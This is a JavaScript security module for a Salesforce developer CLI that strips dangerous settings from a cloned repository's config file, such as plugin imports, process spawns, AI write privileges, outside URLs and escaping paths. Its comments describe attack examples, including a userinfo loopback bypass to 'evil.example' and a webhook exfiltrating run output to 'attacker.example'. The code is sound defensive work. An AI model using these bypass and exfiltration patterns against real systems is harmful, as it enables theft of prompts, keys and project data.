/**
 * Trust boundary for `.sfdt/config.json`.
 *
 * `sfdt init` tells users to gitignore only `.sfdt/*.local.json`, so
 * `config.json` is *meant* to be committed and shared — which means it arrives
 * with whatever repository the user cloned. It is therefore attacker-controlled
 * input, not user input.
 *
 * **It classifies by capability, not by key name.** The first version of this
 * module enumerated five keys, so every new path-shaped, URL-shaped or
 * privilege-shaped key shipped unguarded until someone remembered to add it
 * (sfdt-private#14). The rules below are grouped by what a value *does*, and
 * each group is driven by a set a new key joins in one line:
 *
 *   - **Code execution** — `plugins[]`, `pluginOptions.autoDiscover`:
 *     dynamically import()ed at CLI startup.
 *   - **Process spawn** — `mcp.salesforce.command` / `args`.
 *   - **Privilege** — `ai.agent.*`: grants the AI model write access to the
 *     checkout. No longer honoured from a config file at all (see below).
 *   - **Destination** — `ai.baseURL`, a notification channel's literal
 *     `webhookUrl` / `url`: chooses where prompts and secrets are sent.
 *   - **Path** — `PROJECT_PATH_CONFIG_KEYS` in `safe-path.js`: every key whose
 *     value becomes a filesystem path, contained to the project root.
 *
 * The dashboard already encodes exactly this model: `gui-server/index.js`
 * blocklists these keys from its PATCH endpoint. That check sat one layer too
 * high — it stopped the *API* writing them while the config file itself was
 * trusted implicitly. This module moves the decision to where the file actually
 * crosses the trust boundary: load time. The GUI's own path-containment copy is
 * gone; both surfaces now call `isPathWithinRoot` from `safe-path.js`.
 *
 * **The opt-in cannot live in the config file.** An `allowPlugins: true` key
 * would be set by the same attacker who set `plugins[]`. Trust has to arrive
 * over a channel the repository does not control, so it is an environment
 * variable — which the project's own security review already treats as trusted
 * ("attackers are generally not able to modify them in a secure environment").
 *
 * This is the interim guard. The fuller model — a user-global trust store keyed
 * by project root, VS Code style, with an interactive first-run prompt — is
 * tracked as follow-up work; this deny-by-default behaviour is what that would
 * fall back to for non-interactive runs anyway.
 */

import { PROJECT_PATH_CONFIG_KEYS, isPathWithinRoot } from './safe-path.js';

/** Environment variable that opts a shell in to repo-supplied unsafe settings. */
export const TRUST_ENV_VAR = 'SFDT_ALLOW_UNSAFE_CONFIG';

/**
 * Environment variable that grants the write-capable agent loop, separately
 * from the blanket config opt-in above.
 *
 * Kept distinct from `TRUST_ENV_VAR` on purpose: trusting a repo's plugin list
 * is a much smaller decision than handing a model `Edit` in your checkout, and
 * one should not imply the other. `agent-loop.js` reads this; nothing in
 * `.sfdt/config.json` can substitute for it.
 */
export const AI_WRITE_ENV_VAR = 'SFDT_ALLOW_AI_WRITE';

/**
 * The privilege keys: booleans that used to grant the write-capable agent loop
 * straight from the committed file.
 *
 * `runFixLoop` hands the model `Edit` + `Bash` with `cwd: projectRoot` and its
 * own header calls it "the highest-risk feature in the suite" — yet both of its
 * gates were read from the file that arrives with the clone. The authority now
 * lives in `AI_WRITE_ENV_VAR`; these are refused here as well so that nothing
 * downstream (the dashboard's settings view, a future consumer) can read a
 * cloned repo's `true` as the operator's intent.
 */
const PRIVILEGE_KEYS = Object.freeze([
  {
    path: 'ai.agent.enabled',
    why: 'turns on the write-capable auto-fix loop, which grants the AI model Edit access to this checkout',
  },
  {
    path: 'ai.agent.allowWrite',
    why: 'grants the AI model write access to this checkout; only ' + AI_WRITE_ENV_VAR + '=1 can do that now',
  },
]);

/**
 * A loopback destination cannot exfiltrate to an attacker, so it stays allowed.
 * This keeps the common legitimate `ai.baseURL` — Ollama, LM Studio, llama.cpp,
 * vLLM — working with no opt-in, and mirrors the loopback test `ai.js` already
 * applies when probing an HTTP provider.
 */
const LOOPBACK_HOSTS = new Set(['localhost', '127.0.0.1', '0.0.0.0', '[::1]', '::1']);

/**
 * True only when `value` is an http(s) URL whose *resolved host* is loopback.
 *
 * Parsed, not pattern-matched. The regex this replaced anchored the host but not
 * the authority, so `http://127.0.0.1:80@evil.example/v1` read as loopback — the
 * part before the `@` is userinfo, and the real host was `evil.example`. That
 * mattered because the exemption keeps `ai.headersEnv` and the `apiKeyEnv`
 * Authorization header in place *precisely because* it judged the destination
 * safe, so a false positive shipped the API key and every prompt body offsite.
 *
 * Userinfo is rejected outright rather than ignored: no legitimate local
 * inference server needs it, and `user@host` in a config value is far more
 * likely to be an attempt at this bypass than a real credential.
 */
export function isLoopbackUrl(value) {
  if (typeof value !== 'string' || !value) return false;
  let url;
  try {
    url = new URL(value.trim());
  } catch {
    return false;
  }
  if (url.protocol !== 'http:' && url.protocol !== 'https:') return false;
  if (url.username || url.password) return false;
  return LOOPBACK_HOSTS.has(url.hostname.toLowerCase());
}

/**
 * The channel keys that name a destination *literally*, in the precedence order
 * `notifier.js` `channelUrl()` uses.
 *
 * The `*Env` siblings (`webhookUrlEnv`, `urlEnv`) are deliberately absent: that
 * destination comes from the operator's shell, not the repository, and keeping
 * them working is the contract `notifier.js`'s own header documents.
 *
 * This list and `channelUrl()` are one mechanism in two files — if a new
 * literal key is added there and not here, the guard silently stops covering
 * the channel's real destination.
 */
const LITERAL_CHANNEL_URL_KEYS = Object.freeze(['webhookUrl', 'url']);

/** Read a dotted path out of a plain object; undefined if any segment is missing. */
function getAtPath(obj, dotted) {
  let cur = obj;
  for (const seg of dotted.split('.')) {
    if (!cur || typeof cur !== 'object') return undefined;
    cur = cur[seg];
  }
  return cur;
}

/**
 * Delete a dotted path, copying every object along the way.
 *
 * Copy-on-write rather than in-place: `sanitizeUntrustedConfig` promises not to
 * mutate its input, and the input is the object the caller may still hold.
 */
function deleteAtPath(root, dotted) {
  const segs = dotted.split('.');
  const last = segs.pop();
  let cur = root;
  for (const seg of segs) {
    if (!cur[seg] || typeof cur[seg] !== 'object') return;
    cur[seg] = { ...cur[seg] };
    cur = cur[seg];
  }
  delete cur[last];
}

/**
 * Find the settings in a config that a cloned repository must not be able to set.
 *
 * Pure and side-effect free — `sanitizeUntrustedConfig` applies the result, and
 * `sfdt doctor` can report it without changing anything.
 *
 * Every finding's `path` is a **contract**: `sanitizeUntrustedConfig` removes
 * exactly that dotted path (channel entries carry a `[i]` index segment, which
 * it splits back out). The two functions have to move together.
 *
 * @param {object} config Merged config object.
 * @param {{projectRoot?: string}} [options] Containment root for path keys;
 *   defaults to the `_projectRoot` `loadConfig` stamps onto the merged config.
 * @returns {Array<{path: string, why: string, detail: string}>} Findings, empty if clean.
 */
export function findUnsafeConfigSettings(config, options = {}) {
  const found = [];
  if (!config || typeof config !== 'object') return found;
  const projectRoot = options.projectRoot ?? config._projectRoot ?? process.cwd();

  // ── Code execution ──────────────────────────────────────────────────────
  if (Array.isArray(config.plugins) && config.plugins.some((p) => typeof p === 'string' && p.trim())) {
    const names = config.plugins.filter((p) => typeof p === 'string' && p.trim()).map((p) => p.trim());
    found.push({
      path: 'plugins',
      why: 'entries are dynamically imported at CLI startup, before any command runs',
      detail: names.join(', '),
    });
  }

  // `pluginOptions.autoDiscover` is the same primitive wearing a different hat:
  // it makes the loader sweep the project's `node_modules/` for `sfdt-plugin-*`
  // AND import every `.js`/`.mjs` in `.sfdt/plugins/`. Guarding `plugins[]`
  // alone leaves both of those open to exactly the attack `plugins[]` was
  // guarded against — a cloned repo can vendor `node_modules/sfdt-plugin-evil/`
  // or drop a file in `.sfdt/plugins/` and flip this one boolean. Verified: both
  // executed before this was added.
  if (config.pluginOptions?.autoDiscover === true) {
    found.push({
      path: 'pluginOptions.autoDiscover',
      why: 'imports every sfdt-plugin-* in node_modules/ and every file in .sfdt/plugins/ at CLI startup',
      detail: 'true',
    });
  }

  // ── Process spawn ───────────────────────────────────────────────────────
  const mcpCommand = config.mcp?.salesforce?.command;
  if (typeof mcpCommand === 'string' && mcpCommand.trim()) {
    found.push({
      path: 'mcp.salesforce.command',
      why: 'is spawned as a process when an MCP-backed feature runs',
      detail: [mcpCommand, ...(Array.isArray(config.mcp?.salesforce?.args) ? config.mcp.salesforce.args : [])]
        .join(' '),
    });
  }

  // ── Privilege ───────────────────────────────────────────────────────────
  for (const key of PRIVILEGE_KEYS) {
    if (getAtPath(config, key.path) === true) {
      found.push({ path: key.path, why: key.why, detail: 'true' });
    }
  }

  // ── Exfiltration destination ────────────────────────────────────────────
  const baseURL = config.ai?.baseURL;
  if (typeof baseURL === 'string' && baseURL.trim() && !isLoopbackUrl(baseURL)) {
    found.push({
      path: 'ai.baseURL',
      why: 'chooses where prompts, and any secrets named by ai.apiKeyEnv / ai.headersEnv, are sent',
      detail: baseURL.trim(),
    });
  }

  // A notification channel is the webhook form of the same primitive, so it
  // gets the same rule: *any* literal non-loopback destination is refused,
  // whether or not the channel also names env vars to read.
  //
  // The earlier rule only fired when `headersEnv` was present beside the URL,
  // which missed the plainest attack there is — a cloned repo shipping
  // `{type:"slack", webhookUrl:"https://attacker.example/collect"}` and letting
  // the victim's own `--notify` run POST org aliases and failure text to it.
  // No secret env var needed; the message body is the payload.
  const channels = Array.isArray(config.notifications?.channels) ? config.notifications.channels : [];
  const legacySlack = config.notifications?.slack;
  for (const [i, ch] of [...channels.entries(), ...(legacySlack ? [['slack', legacySlack]] : [])]) {
    if (!ch || typeof ch !== 'object') continue;
    const label = typeof i === 'number' ? `notifications.channels[${i}]` : 'notifications.slack';
    for (const key of LITERAL_CHANNEL_URL_KEYS) {
      const url = ch[key];
      if (typeof url !== 'string' || !url.trim() || isLoopbackUrl(url)) continue;
      found.push({
        path: `${label}.${key}`,
        why: 'posts run output — org alias, deploy and test failure text, audit summaries — to a destination fixed by this config',
        detail: url.trim(),
      });
    }
    // An email channel's destination is `to[]`, not a URL, so it never reaches
    // channelUrl() and LITERAL_CHANNEL_URL_KEYS above cannot see it. Same
    // capability — a destination fixed by the repository — so it belongs in the
    // same class: a committed config naming an attacker recipient mails run
    // output out through the victim's own SMTP relay.
    if (ch.type === 'email') {
      const recipients = (Array.isArray(ch.to) ? ch.to : [])
        .filter((addr) => typeof addr === 'string' && addr.trim());
      if (recipients.length) {
        found.push({
          path: `${label}.to`,
          why: 'mails run output — org alias, deploy and test failure text, audit summaries — to a recipient fixed by this config',
          detail: recipients.join(', '),
        });
      }
    }
  }

  // ── Filesystem path ─────────────────────────────────────────────────────
  // The whole class at once, from one shared set. Every one of these values is
  // handed to path.join/path.resolve and then written to or globbed; an
  // absolute or `../`-escaping value redirects those writes and reads outside
  // the project. Verified for `manifestDir`, which reached /tmp/evil/pkg.xml.
  for (const key of PROJECT_PATH_CONFIG_KEYS) {
    const value = getAtPath(config, key);
    if (typeof value !== 'string' || !value.trim()) continue;
    if (isPathWithinRoot(projectRoot, value.trim())) continue;
    found.push({
      path: key,
      why: 'is resolved to a filesystem path this CLI reads and writes, and this value escapes the project root',
      detail: value.trim(),
    });
  }

  return found;
}

/**
 * Strip repo-supplied settings that would execute code or exfiltrate secrets.
 *
 * Returns a shallow copy with only the offending paths removed — every other
 * key, including `ai.apiKeyEnv` and a channel's `webhookUrlEnv`, loads
 * untouched. Those are only dangerous next to an attacker-chosen destination,
 * which is the thing actually removed here.
 *
 * @param {object} config Merged config object.
 * @param {{allow?: boolean, projectRoot?: string}} [options] `allow` defaults to
 *   the TRUST_ENV_VAR opt-in; `projectRoot` is passed through for path keys.
 * @returns {{config: object, refused: Array<{path: string, why: string, detail: string}>}}
 */
export function sanitizeUntrustedConfig(config, options = {}) {
  const allow = options.allow ?? process.env[TRUST_ENV_VAR] === '1';
  const found = findUnsafeConfigSettings(config, options);
  if (allow || found.length === 0) return { config, refused: [] };

  const next = { ...config };
  for (const finding of found) {
    // Channel findings are the one shape that is not a plain dotted path — the
    // `[i]` segment indexes an array, so they are split out and applied to the
    // one channel. `findUnsafeConfigSettings` builds these labels; the two ends
    // of that contract have to be edited together.
    const channelMatch = /^notifications\.channels\[(\d+)\]\.(.+)$/.exec(finding.path);
    if (channelMatch) {
      const [, idx, key] = channelMatch;
      next.notifications = { ...next.notifications };
      next.notifications.channels = next.notifications.channels.map((ch, i) => {
        if (i !== Number(idx)) return ch;
        const copy = { ...ch };
        delete copy[key];
        return copy;
      });
      continue;
    }
    if (finding.path === 'mcp.salesforce.command') {
      // Drop `args` with the command: on its own it is inert, and leaving it
      // behind would apply attacker-chosen arguments to the default `sf` binary.
      deleteAtPath(next, 'mcp.salesforce.command');
      deleteAtPath(next, 'mcp.salesforce.args');
      continue;
    }
    deleteAtPath(next, finding.path);
  }

  return { config: next, refused: found };
}

/**
 * Human-readable explanation of what was refused and how to allow it.
 *
 * @param {Array<{path: string, why: string, detail: string}>} refused
 * @param {string} [configPath] Where the config came from, for the message.
 * @returns {string} Empty string when nothing was refused.
 */
export function formatRefusals(refused, configPath = '.sfdt/config.json') {
  if (!refused || refused.length === 0) return '';
  const lines = [
    `Refused ${refused.length} setting${refused.length === 1 ? '' : 's'} from ${configPath}:`,
    '',
  ];
  for (const r of refused) {
    lines.push(`  ${r.path} — ${r.why}`);
    if (r.detail) lines.push(`    value: ${r.detail}`);
  }
  lines.push(
    '',
    'This file is normally committed, so it arrives with the repository rather than',
    'from you. Everything else in it loaded normally.',
    '',
    `If you trust this project, allow these settings for your shell:  export ${TRUST_ENV_VAR}=1`,
  );
  return lines.join('\n');
}
